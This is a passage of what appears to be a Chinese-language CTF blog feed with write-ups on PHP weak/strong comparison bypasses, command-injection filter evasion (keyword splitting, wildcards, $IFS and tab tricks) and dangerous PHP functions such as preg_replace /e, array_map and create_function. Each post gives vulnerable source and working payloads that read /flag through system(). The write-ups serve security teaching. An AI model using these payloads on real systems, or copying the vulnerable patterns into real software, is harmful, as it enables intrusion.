class="keyword">echo</span> <span class="string">&quot;绕过PHP检测就可以得到FLAG&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>有关强比较&#x2F;弱比较漏洞的原理可参考：</p><p><a href="https://www.yuque.com/shiyizhesonder/sonder39/xit572hsmwbxqkae">https://www.yuque.com/shiyizhesonder/sonder39/xit572hsmwbxqkae</a></p><p>利用数组即可绕过，也可尝试其它绕过方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ctf.seek2.top:32796/?var1[]=1&amp;var2[]=2</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP代码审计" scheme="http://example.com/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="强比较漏洞" scheme="http://example.com/tags/%E5%BC%BA%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>PHP弱比较漏洞</title>
    <link href="http://example.com/2024/03/05/%E5%BC%B1%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/03/05/%E5%BC%B1%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-03-05T10:13:16.000Z</published>
    <updated>2024-10-23T01:34:18.628Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在PHP中，存在两种类型的比较：强比较和弱比较。</p><ol><li>弱比较是使用双等号&#x3D;&#x3D;进行的比较。在进行弱比较时，如果两个操作数的类型不同，PHP会尝试进行类型转换，然后再进行比较。例如，字符串’0’和数字0在进行弱比较时，会被认为是相等的。</li><li>强比较是使用三等号&#x3D;&#x3D;&#x3D;进行的比较。在进行强比较时，如果两个操作数的类型不同，那么它们就会被认为是不等的，即使它们的值相同。例如，字符串’0’和数字0在进行强比较时，会被认为是不等的。</li></ol><p>在某些情况下，弱比较可能会导致意想不到的结果，从而产生安全问题。例如，如果一个应用程序使用弱比较来检查密码，可以通过提交特定的数据来绕过密码检查。</p><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;var1&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;var2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var1&#x27;</span>]) == <span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;绕过PHP检测就可以得到FLAG&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>       </span><br></pre></td></tr></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>有关强比较&#x2F;弱比较漏洞的原理可参考：</p><p><a href="https://www.yuque.com/shiyizhesonder/sonder39/xit572hsmwbxqkae">https://www.yuque.com/shiyizhesonder/sonder39/xit572hsmwbxqkae</a></p><p>利用数组即可绕过，也可尝试其它绕过方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ctf.seek2.top:32793/?var1[]=1&amp;var2[]=2</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;在PHP中，存在两种类型的比较：强比较和弱比较。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;弱比较是使用双等号&amp;#x3D;&amp;#x3D;进行的比较。在进行弱比</summary>
      
    
    
    
    <category term="PHP代码审计" scheme="http://example.com/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="弱比较漏洞" scheme="http://example.com/tags/%E5%BC%B1%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>综合绕过</title>
    <link href="http://example.com/2024/03/05/%E7%BB%BC%E5%90%88%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2024/03/05/%E7%BB%BC%E5%90%88%E7%BB%95%E8%BF%87/</id>
    <published>2024-03-05T10:13:15.000Z</published>
    <updated>2024-03-06T10:04:40.335Z</updated>
    
    <content type="html"><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>这里输入 127.0.0.1 时，输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.033 ms</span><br><span class="line">64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.064 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 packets received, 0% packet loss</span><br><span class="line">round-trip min/avg/max = 0.033/0.048/0.064 ms</span><br><span class="line"></span><br><span class="line">系统检测到该设备处于在线状态      </span><br></pre></td></tr></table></figure><p>尝试命令执行 <code>127.0.0.1;cat /flag</code> ，输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;catflag意图不明，检查输入</span><br></pre></td></tr></table></figure><p>继续尝试，发现很多特殊字符被替换为空，对网站进行扫描，发现有 <a href="http://www.zip/">www.zip</a> 文件泄露，下载后获得过滤的源码</p><p>flag中每个字符也被过滤，最终采用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;cat$IFS`ls`</span><br></pre></td></tr></table></figure><p>即可绕过，查看页面源码就可以看到 flag，也可以尝试其它办法</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;这里输入 127.0.0.1 时，输出&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr</summary>
      
    
    
    
    <category term="命令执行" scheme="http://example.com/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
    <category term="综合" scheme="http://example.com/tags/%E7%BB%BC%E5%90%88/"/>
    
  </entry>
  
  <entry>
    <title>关键字过滤绕过</title>
    <link href="http://example.com/2024/03/05/%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2024/03/05/%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87/</id>
    <published>2024-03-05T10:13:14.000Z</published>
    <updated>2024-10-23T01:28:17.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h1><p>例如cat</p><ol><li>拼接绕过，<code>a=ca;b=t;$a$b /flag</code></li><li>命令替换绕过，<br>more:一页一页的显示文件内容, <code>more /flag</code><br>less:与 more 类似，<code>less /flag</code><br>head:查看头几行 <code>head /flag</code><br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 <code>tac /flag</code><br>tail:查看尾几行 <code>tail /flag</code><br>nl：显示的时候，顺便输出行号 <code>nl /flag</code><br>od:以二进制的方式读取档案内容 <code>od /flag</code>,有些问题没有解决<br>vi:编辑器命令<br>vim:编辑器命令<br>sort: 排序命令，可以查看 <code>sort /flag</code><br>uniq: 可以查看 <code>uniq /flag</code><br>file -f:报错出具体内容<br>sh &#x2F;flag 2&gt;%261 &#x2F;&#x2F;报错出文件内容</li></ol><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>这里输入 127.0.0.1 时，输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.033 ms</span><br><span class="line">64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.064 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 packets received, 0% packet loss</span><br><span class="line">round-trip min/avg/max = 0.033/0.048/0.064 ms</span><br><span class="line"></span><br><span class="line">系统检测到该设备处于在线状态      </span><br></pre></td></tr></table></figure><p>尝试命令执行 <code>127.0.0.1;cat /flag</code> ，输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器检测到可疑字符串cat，启动了查杀程序😋    </span><br></pre></td></tr></table></figure><p>根据总结的绕过方法不断尝试，最终</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;a=ca;b=t;$a$b /flag</span><br></pre></td></tr></table></figure><p>即可绕过，也可以尝试总结的其它办法</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;过滤关键字&quot;&gt;&lt;a href=&quot;#过滤关键字&quot; class=&quot;headerlink&quot; title=&quot;过滤关键字&quot;&gt;&lt;/a&gt;过滤关键字&lt;/h1&gt;&lt;p&gt;例如cat&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;拼接绕过，&lt;code&gt;a=ca;b=t;$a$b /flag&lt;/code&gt;&lt;/</summary>
      
    
    
    
    <category term="命令执行" scheme="http://example.com/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
    <category term="关键字绕过" scheme="http://example.com/tags/%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>目标文件名绕过</title>
    <link href="http://example.com/2024/03/05/%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%90%8D%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2024/03/05/%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%90%8D%E7%BB%95%E8%BF%87/</id>
    <published>2024-03-05T10:13:14.000Z</published>
    <updated>2024-03-06T10:04:28.633Z</updated>
    
    <content type="html"><![CDATA[<h1 id="过滤目标文件"><a href="#过滤目标文件" class="headerlink" title="过滤目标文件"></a>过滤目标文件</h1><p>使用通配符 <code>?</code>, <code>*</code>代替文件名中的字符</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>这里输入 127.0.0.1 时，输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.033 ms</span><br><span class="line">64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.064 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 packets received, 0% packet loss</span><br><span class="line">round-trip min/avg/max = 0.033/0.048/0.064 ms</span><br><span class="line"></span><br><span class="line">系统检测到该设备处于在线状态      </span><br></pre></td></tr></table></figure><p>尝试命令执行 <code>127.0.0.1;cat /flag</code> ，输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器检测到可疑文件读取&#x27;flag&#x27;，启动了查杀程序😋      </span><br></pre></td></tr></table></figure><p>根据总结的绕过方法不断尝试，最终</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;cat /f???</span><br></pre></td></tr></table></figure><p>即可绕过，也可以尝试总结的其它办法</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;过滤目标文件&quot;&gt;&lt;a href=&quot;#过滤目标文件&quot; class=&quot;headerlink&quot; title=&quot;过滤目标文件&quot;&gt;&lt;/a&gt;过滤目标文件&lt;/h1&gt;&lt;p&gt;使用通配符 &lt;code&gt;?&lt;/code&gt;, &lt;code&gt;*&lt;/code&gt;代替文件名中的字符&lt;/p&gt;
&lt;h1 </summary>
      
    
    
    
    <category term="命令执行" scheme="http://example.com/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
    <category term="目标文件名绕过" scheme="http://example.com/tags/%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%90%8D%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>空格绕过</title>
    <link href="http://example.com/2024/03/05/%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2024/03/05/%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</id>
    <published>2024-03-05T10:13:13.000Z</published>
    <updated>2024-10-23T01:27:53.152Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>命令执行是一种常见的攻击方式。服务器通常会通过各种方式来防止命令执行。例如，服务器可能会对输入的参数进行校验，只允许特定格式的参数，或者只允许特定的命令。</p><p>然而，这些防护措施并不是万无一失的。攻击者可能会找到绕过这些防护措施的方法，使得攻击者可以在服务器上执行任意命令。</p><h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><ol><li>制表符%09，<code>cat%09/flag</code></li><li>&lt;, <code>cat&lt;/flag</code>, <code>cat%3C/flag</code></li><li>{}, <code>&#123;cat,/flag&#125;</code></li><li>${IFS}, <code>cat$&#123;IFS&#125;/flag</code></li><li>$IFS$9, <code>cat$IFS$9/flag</code></li></ol><p>同一种绕过方法可能小概率会因为linux系统版本不同失效</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>这里输入 127.0.0.1 时，输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.033 ms</span><br><span class="line">64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.064 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 packets received, 0% packet loss</span><br><span class="line">round-trip min/avg/max = 0.033/0.048/0.064 ms</span><br><span class="line"></span><br><span class="line">系统检测到该设备处于在线状态      </span><br></pre></td></tr></table></figure><p>尝试命令执行 <code>127.0.0.1;cat /flag</code> ，输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器检测到可疑的空格，启动了查杀程序😋                        </span><br></pre></td></tr></table></figure><p>根据总结的绕过方法不断尝试，最终</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;cat%3C/flag</span><br></pre></td></tr></table></figure><p>即可绕过，也可以尝试总结的其它办法</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;命令执行是一种常见的攻击方式。服务器通常会通过各种方式来防止命令执行。例如，服务器可能会对输入的参数进行校验，只允许特定格式的参数，或者只允</summary>
      
    
    
    
    <category term="命令执行" scheme="http://example.com/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
    <category term="空格绕过" scheme="http://example.com/tags/%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>可变函数</title>
    <link href="http://example.com/2024/03/05/%E5%8F%AF%E5%8F%98%E5%87%BD%E6%95%B0/"/>
    <id>http://example.com/2024/03/05/%E5%8F%AF%E5%8F%98%E5%87%BD%E6%95%B0/</id>
    <published>2024-03-05T10:13:12.000Z</published>
    <updated>2024-10-23T01:34:25.028Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>])) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;func1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func2</span>(<span class="params"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;func2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func3</span>(<span class="params"><span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;func3的参数：&quot;</span> . <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line">    <span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$func</span>(<span class="variable">$arg</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;服务器剩余防御：1层&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>              </span><br></pre></td></tr></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>存在可变函数，可以构造函数执行系统命令，使用下面的参数即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ctf.seek2.top:32811/?func=system&amp;arg=cat%20/flag</span><br></pre></td></tr></table></figure><p>第一个参数是函数名，第二个是参数</p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>在 PHP 中，可以使用变量来调用函数，这就是所谓的可变函数。可以将函数名存储在一个变量中，然后通过这个变量来调用函数。</p><p>如果传入 <code>system</code> 作为函数名，并传入 <code>ls</code> 作为参数，那么 PHP 将会执行 <code>system(&#39;ls&#39;)</code>。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$func</span>(<span class="variable">$arg</span>);</span><br></pre></td></tr></table></figure><p>在这个例子中，PHP 将会执行 <code>system(&#39;ls&#39;)</code>，并将结果输出。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP代码审计" scheme="http://example.com/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHP常见函数" scheme="http://example.com/tags/PHP%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>preg_replace()</title>
    <link href="http://example.com/2024/03/05/preg_replace()/"/>
    <id>http://example.com/2024/03/05/preg_replace()/</id>
    <published>2024-03-05T10:13:11.000Z</published>
    <updated>2024-03-06T10:03:46.564Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$subject</span> = <span class="string">&#x27;hello hack&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/hack/e&#x27;</span>;</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;服务器剩余防御：1层&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>             </span><br></pre></td></tr></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>存在函数preg_replace()存在&#x2F;e选项 ，可以执行系统命令，使用下面的参数即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ctf.seek2.top:32820/?name=system(%27cat%20/flag%27);</span><br></pre></td></tr></table></figure><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>在 PHP 的 <code>preg_replace()</code> 函数中，<code>/e</code> 是一个修饰符，表示对替换部分进行 <code>eval()</code> 处理，也就是说，替换部分会被当作 PHP 代码执行。</p><p>如果传入 <code>system(&#39;ls&#39;)</code> 作为替换部分，那么 <code>preg_replace()</code> 将会执行 <code>system(&#39;ls&#39;)</code> 命令，并将结果用于替换匹配到的部分。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/hack/e&#x27;</span>;</span><br><span class="line"><span class="variable">$replacement</span> = <span class="string">&#x27;system(&quot;ls&quot;)&#x27;</span>;</span><br><span class="line"><span class="variable">$subject</span> = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>preg_replace()</code> 将会找到 <code>hack</code>，然后执行 <code>system(&#39;ls&#39;)</code>，并将结果用于替换 <code>hack</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP代码审计" scheme="http://example.com/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHP常见函数" scheme="http://example.com/tags/PHP%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>array_map()</title>
    <link href="http://example.com/2024/03/05/array_map()/"/>
    <id>http://example.com/2024/03/05/array_map()/</id>
    <published>2024-03-05T10:13:10.000Z</published>
    <updated>2024-10-23T01:26:47.999Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;argv&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line">    <span class="variable">$argv</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">    <span class="variable">$array</span>[<span class="number">0</span>] = <span class="variable">$argv</span>;</span><br><span class="line">    <span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>, <span class="variable">$array</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;服务器剩余防御：1层&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>                        </span><br></pre></td></tr></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>存在危险函数array_map()，可以适当构造执行系统命令，使用下面的参数即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ctf.seek2.top:32817/?func=system&amp;argv=cat%20%20/flag</span><br></pre></td></tr></table></figure><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p><code>array_map()</code> 是 PHP 的一个内置函数，它接受一个回调函数和一个或多个数组，然后对每个数组的元素应用回调函数，并返回一个新的数组。</p><p>如果传入 <code>system</code> 作为回调函数，并传入一个包含 <code>ls</code> 的数组，那么 <code>array_map()</code> 将会对每个元素执行 <code>system(&#39;ls&#39;)</code>。<code>system</code> 函数会执行 <code>ls</code> 命令。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$array</span> = [<span class="string">&#x27;ls&#x27;</span>];</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>, <span class="variable">$array</span>);</span><br></pre></td></tr></table></figure><p><code>array_map()</code> 将会执行 <code>system(&#39;ls&#39;)</code>，并将结果输出。然后，它将返回一个新的数组，其中的每个元素都是 <code>system(&#39;ls&#39;)</code> 的返回值。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP代码审计" scheme="http://example.com/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHP常见函数" scheme="http://example.com/tags/PHP%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>create_function()</title>
    <link href="http://example.com/2024/03/05/create_function()/"/>
    <id>http://example.com/2024/03/05/create_function()/</id>
    <published>2024-03-05T10:13:09.000Z</published>
    <updated>2024-10-23T01:34:05.461Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;echo&#x27;</span>.<span class="variable">$func</span>.<span class="string">&#x27;id:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$func&#x27;</span>, <span class="variable">$code</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;服务器剩余防御：1层&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>         </span><br></pre></td></tr></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>存在危险函数create_function()，可以适当构造执行系统命令，使用下面的参数即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ctf.seek2.top:32814/?id=&#125;system(%27cat%20/flag%27);//</span><br></pre></td></tr></table></figure><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p><code>create_function()</code> 是 PHP 的一个内置函数，它可以创建一个匿名的 lambda 函数，并返回这个函数的引用。这个函数的实现基于 <code>eval()</code>，因此它也存在执行任意 PHP 代码的风险。</p><p>当传入一个以 <code>&#125;</code> 